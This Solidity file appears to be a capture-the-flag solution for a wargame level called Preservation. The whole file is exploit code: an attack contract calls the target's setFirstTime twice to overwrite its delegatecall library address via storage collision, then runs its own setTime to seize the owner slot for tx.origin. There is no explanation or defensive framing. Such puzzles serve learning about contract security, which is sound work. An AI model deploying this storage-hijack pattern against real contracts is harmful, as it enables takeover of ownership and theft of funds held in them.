// SPDX-License-Identifier: MIT

import "./Preservation.sol";

pragma solidity ^0.8.0;

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(address _preservation) public {
        Preservation preservation = Preservation(_preservation);
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(uint256(uint160(address(this))));
    }

    function setTime(uint _time) public {
        timeZone1Library = address(this);
        timeZone2Library = address(this);
        owner = tx.origin;
    }
}
